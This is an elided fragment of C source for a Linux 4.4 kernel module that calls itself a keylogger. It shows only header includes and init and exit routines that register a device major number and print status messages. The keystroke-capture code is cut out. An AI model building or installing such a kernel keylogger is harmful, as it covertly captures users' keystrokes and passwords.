#include </usr/src/linux-4.4.76-1/include/linux/module.h>
#include </usr/src/linux-4.4.76-1/include/linux/kernel.h>
#include </usr/src/linux-4.4.76-1/include/linux/keyboard.h>
#include </usr/src/linux-4.4.76-1/include/linux/fs.h>
#include </usr/src/linux-4.4.76-1/include/linux/uaccess.h>
#include </usr/src/linux-4.4.76-1/include/linux/notifier.h>
...
static int __init keylog_init(void) {
	...
	if (major < 0) {
		...
		//printk("keylog failed to register a major number\n");
		
		return major;
	}
	
	printk(KERN_INFO "%d\n", major);	
	//printk("Registered keylogger with major number %d", major);	
...
static void __exit keylog_exit(void) {
	...
	printk(KERN_INFO "Keylogger unloaded %d\n", major);
